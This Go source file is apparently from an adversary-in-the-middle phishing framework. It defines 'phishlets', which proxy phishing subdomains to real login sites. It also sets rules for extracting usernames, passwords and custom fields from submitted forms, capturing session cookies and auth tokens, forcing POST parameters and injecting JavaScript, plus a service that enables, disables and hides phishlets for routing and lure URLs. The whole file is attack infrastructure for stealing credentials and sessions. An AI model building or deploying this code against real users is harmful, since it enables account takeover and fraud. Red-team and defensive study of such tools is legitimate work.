package aitm

import (
	"fmt"
	"regexp"
	"strings"
	"sync"
)

// PhishletStore is the persistence interface required by PhishletService.
type PhishletStore interface {
	GetPhishletConfig(name string) (*PhishletConfig, error)
	SetPhishletConfig(cfg *PhishletConfig) error
	ListPhishletConfigs() ([]*PhishletConfig, error)
	DeletePhishletConfig(name string) error

	CreateSubPhishlet(sp *SubPhishlet) error
	GetSubPhishlet(name string) (*SubPhishlet, error)
	ListSubPhishlets(parent string) ([]*SubPhishlet, error)
	DeleteSubPhishlet(name string) error
}

// PhishletDef is the compiled, fully-resolved form of a phishlet YAML file.
// All regex fields are pre-compiled. Template parameters have been substituted.
type PhishletDef struct {
	Name        string
	Author      string
	Version     string
	ProxyHosts  []ProxyHost
	SubFilters  []SubFilter
	AuthTokens  []TokenRule
	Credentials CredentialRules
	Login       LoginSpec
	ForcePosts  []ForcePost
	Intercepts  []InterceptRule
	JSInjects   []JSInject
	AuthURLs    []*regexp.Regexp
}

func (p *PhishletDef) MatchesHost(hostname, baseDomain string) bool {
	for _, host := range p.ProxyHosts {
		if hostname == host.PhishSubdomain+"."+baseDomain {
			return true
		}
	}
	return false
}

func (p *PhishletDef) FindLanding() *ProxyHost {
	for i := range p.ProxyHosts {
		if p.ProxyHosts[i].IsLanding {
			return &p.ProxyHosts[i]
		}
	}
	return nil
}

func (p *PhishletDef) MatchesAuthURL(rawURL string) bool {
	for _, authURL := range p.AuthURLs {
		if authURL.MatchString(rawURL) {
			return true
		}
	}
	return false
}

// PhishletConfig is the runtime state of a phishlet stored in the database.
// Separate from PhishletDef (the static YAML definition).
type PhishletConfig struct {
	Name        string
	BaseDomain  string
	DNSProvider string
	Hostname    string
	UnauthURL   string
	SpoofURL    string
	Enabled     bool
	Hidden      bool
}

// SubPhishlet is a named instantiation of a template PhishletDef with resolved params.
type SubPhishlet struct {
	Name       string
	ParentName string
	Params     map[string]string
}

// ProxyHost maps a phishing subdomain to a real upstream host.
type ProxyHost struct {
	PhishSubdomain string
	OrigSubdomain  string
	Domain         string
	IsLanding      bool
	IsSession      bool
	AutoFilter     bool
}

// SubFilter is a compiled search/replace rule applied to proxied response bodies.
type SubFilter struct {
	Hostname   string
	MimeTypes  []string
	Search     *regexp.Regexp
	Replace    string
	WithParams []string
}

func (s *SubFilter) MatchesMIME(mimeType string) bool {
	for _, mime := range s.MimeTypes {
		if strings.HasPrefix(mimeType, mime) {
			return true
		}
	}
	return false
}

// TokenType classifies how an auth token is extracted.
type TokenType int

const (
	TokenTypeCookie TokenType = iota
	TokenTypeBody
	TokenTypeHTTPHeader
)

// TokenRule describes how to capture one auth token from a response.
type TokenRule struct {
	Type     TokenType
	Domain   string
	Path     *regexp.Regexp
	Name     *regexp.Regexp
	Search   *regexp.Regexp
	HTTPOnly bool
	Always   bool
}

// CredentialRules groups the extraction rules for username, password, and custom fields.
type CredentialRules struct {
	Username CredentialRule
	Password CredentialRule
	Custom   []CustomCredentialRule
}

// CredentialRule is a key+search regex pair that extracts one field from POST/JSON.
type CredentialRule struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
	Type   string // "post" or "json"
}

// CustomCredentialRule is like CredentialRule but stores into Session.Custom[Name].
type CustomCredentialRule struct {
	Name string
	CredentialRule
}

// LoginSpec identifies where the login form lives.
type LoginSpec struct {
	Domain string
	Path   string
}

// ForcePost describes a POST parameter to inject or override.
type ForcePost struct {
	Path       *regexp.Regexp
	Conditions []ForcePostCondition
	Params     []ForcePostParam
}

type ForcePostCondition struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
}

type ForcePostParam struct {
	Key   string
	Value string
}

// InterceptRule matches a request and returns a fully custom response.
type InterceptRule struct {
	Path        *regexp.Regexp
	BodySearch  *regexp.Regexp
	StatusCode  int
	ContentType string
	Body        string
}

// JSInject defines a JavaScript snippet to inject into matching pages.
type JSInject struct {
	TriggerDomain string
	TriggerPath   *regexp.Regexp
	Script        string
}

// PhishletService owns all business logic for phishlet lifecycle.
// It is the single point of truth for which phishlets are active: every
// enable/disable writes to the store AND updates the in-memory hostname set,
// so the proxy router never falls out of sync with the database.
type PhishletService struct {
	store           PhishletStore
	bus             EventBus
	dns             *DNSService
	activeHostnames sync.Map // hostname (lowercase) → struct{}
}

func NewPhishletService(store PhishletStore, bus EventBus, dns *DNSService) *PhishletService {
	return &PhishletService{store: store, bus: bus, dns: dns}
}

// LoadActiveFromDB populates the in-memory hostname set from the database.
// Call once during startup, before the proxy begins accepting connections.
func (s *PhishletService) LoadActiveFromDB() error {
	configs, err := s.store.ListPhishletConfigs()
	if err != nil {
		return fmt.Errorf("loading active phishlets: %w", err)
	}
	for _, cfg := range configs {
		if cfg.Enabled && cfg.Hostname != "" {
			s.activeHostnames.Store(strings.ToLower(cfg.Hostname), struct{}{})
		}
	}
	return nil
}

// Contains reports whether hostname is currently proxied by an active phishlet.
// Satisfies proxy.HostnameSet so PhishletService can be passed directly to PhishletRouter.
func (s *PhishletService) Contains(hostname string) bool {
	_, ok := s.activeHostnames.Load(strings.ToLower(hostname))
	return ok
}

// Enable marks a phishlet as active, optionally updating its hostname, base
// domain, and DNS provider. The in-memory hostname set is updated atomically
// so routing takes effect immediately without a restart.
func (s *PhishletService) Enable(name, hostname, baseDomain, dnsProvider string) (*PhishletConfig, error) {
	cfg, err := s.store.GetPhishletConfig(name)
	if err != nil {
		cfg = &PhishletConfig{Name: name}
	}
	if hostname != "" {
		cfg.Hostname = hostname
	}
	if baseDomain != "" {
		cfg.BaseDomain = baseDomain
	}
	if dnsProvider != "" {
		cfg.DNSProvider = dnsProvider
	}
	if cfg.Hostname == "" {
		return nil, fmt.Errorf("hostname: required")
	}
	cfg.Enabled = true
	if err := s.store.SetPhishletConfig(cfg); err != nil {
		return nil, err
	}
	s.activeHostnames.Store(strings.ToLower(cfg.Hostname), struct{}{})
	return cfg, nil
}

// Disable marks a phishlet as inactive and removes it from the hostname set.
func (s *PhishletService) Disable(name string) (*PhishletConfig, error) {
	cfg, err := s.store.GetPhishletConfig(name)
	if err != nil {
		return nil, err
	}
	cfg.Enabled = false
	if err := s.store.SetPhishletConfig(cfg); err != nil {
		return nil, err
	}
	if cfg.Hostname != "" {
		s.activeHostnames.Delete(strings.ToLower(cfg.Hostname))
	}
	return cfg, nil
}

// Hide marks a phishlet as hidden (suppressed from lure URL generation).
// Does not affect routing — the phishlet keeps intercepting traffic.
func (s *PhishletService) Hide(name string) (*PhishletConfig, error) {
	cfg, err := s.store.GetPhishletConfig(name)
	if err != nil {
		return nil, err
	}
	cfg.Hidden = true
	if err := s.store.SetPhishletConfig(cfg); err != nil {
		return nil, err
	}
	return cfg, nil
}

// Unhide reverses Hide.
func (s *PhishletService) Unhide(name string) (*PhishletConfig, error) {
	cfg, err := s.store.GetPhishletConfig(name)
	if err != nil {
		return nil, err
	}
	cfg.Hidden = false
	if err := s.store.SetPhishletConfig(cfg); err != nil {
		return nil, err
	}
	return cfg, nil
}

// GetConfig returns the stored config for a phishlet by name.
func (s *PhishletService) GetConfig(name string) (*PhishletConfig, error) {
	return s.store.GetPhishletConfig(name)
}

// ListConfigs returns all stored phishlet configs.
func (s *PhishletService) ListConfigs() ([]*PhishletConfig, error) {
	return s.store.ListPhishletConfigs()
}

// CreateSubPhishlet persists a sub-phishlet instantiation.
func (s *PhishletService) CreateSubPhishlet(sp *SubPhishlet) error {
	return s.store.CreateSubPhishlet(sp)
}

// DeleteSubPhishlet removes a sub-phishlet by name.
func (s *PhishletService) DeleteSubPhishlet(name string) error {
	return s.store.DeleteSubPhishlet(name)
}
